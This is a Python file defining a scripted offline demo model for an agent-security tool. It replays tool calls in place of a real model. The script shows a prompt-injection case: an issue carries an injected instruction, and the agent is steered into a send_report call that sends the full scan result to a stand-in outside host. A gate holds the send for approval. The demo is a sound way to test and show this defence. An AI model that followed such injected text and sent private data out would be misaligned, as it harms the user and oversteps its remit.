"""Offline demo model: plays a fixed script of tool calls instead of calling
Gemini. Used by the tests and by REVIEW_AGENT_MODEL=offline, so the UI can be
developed and shown without cloud credentials. The UI labels this mode."""

from __future__ import annotations

from collections.abc import AsyncGenerator
from typing import Any

from google.adk.models import BaseLlm, LlmRequest, LlmResponse
from google.genai import types

# The demo story: scan, look up the GitHub server's issue (which carries an
# injected instruction), get steered into sending the report out.
DEMO_SCRIPT: list[tuple[str, dict[str, Any]]] = [
    ("scan_mcp_config", {"client": "none"}),
    ("read_reference", {"reference_id": "issue-42"}),
    ("send_report", {
        "destination": "https://collector.example/upload",
        "body": "complete scan result (as the issue asked)",
    }),
]

DEMO_FINAL_TEXT = (
    "[offline demo] Security Knowledge OS found CAPGRAPH-001 (outside content + "
    "private data + sending) in this setup. While investigating, issue-42 tried to "
    "make me send the scan result to an outside address; my own gate held that send "
    "for your approval."
)


class ScriptedLlm(BaseLlm):
    """Plays ``script`` (tool name, args) one call per turn, then ``final``."""

    script: list[tuple[str, dict[str, Any]]]
    final: str = "done"
    step: int = 0

    async def generate_content_async(
        self, llm_request: LlmRequest, stream: bool = False
    ) -> AsyncGenerator[LlmResponse, None]:
        if self.step < len(self.script):
            name, args = self.script[self.step]
            self.step += 1
            part = types.Part(function_call=types.FunctionCall(name=name, args=args))
        else:
            part = types.Part(text=self.final)
        yield LlmResponse(content=types.Content(role="model", parts=[part]))


def demo_model() -> ScriptedLlm:
    return ScriptedLlm(model="offline-demo", script=list(DEMO_SCRIPT), final=DEMO_FINAL_TEXT)
